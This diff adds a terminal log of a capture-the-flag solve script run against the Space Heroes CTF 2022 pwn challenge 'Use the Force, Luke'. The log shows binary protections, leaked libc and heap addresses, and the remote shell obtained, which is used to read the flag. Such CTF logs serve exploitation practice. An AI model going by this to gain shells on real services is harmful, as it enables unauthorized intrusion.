@@ -1,0 +1,27 @@
+mito@ubuntu:~/CTF/Space_Heroes_CTF_2022/Pwn_Use_the_Force,_Luke/force$ python solve.py r
+[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Use_the_Force,_Luke/force/force'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  './.glibc/glibc_2.28_no-tcache'
+[+] Opening connection to 0.cloud.chals.io on port 11996: Done
+[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Use_the_Force,_Luke/force/.glibc/glibc_2.28_no-tcache/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+system_addr = 0x7f9d0515bb70
+libc_base   = 0x7f9d0511a000
+heap_addr   = 0x2112000
+[*] Switching to interactive mode
+What do you feel?: $ id
+uid=1000(luke) gid=1000(luke) groups=1000(luke)
+$ ls -l
+total 16
+-rw-r--r-- 1 root root   37 Mar 24 23:16 flag.txt
+-rwxrwxr-x 1 root root 8880 Feb 10 16:41 force
+$ cat flag.txt
+shctf{st4r_w4rs_1s_pr3tty_0v3rr4t3d}
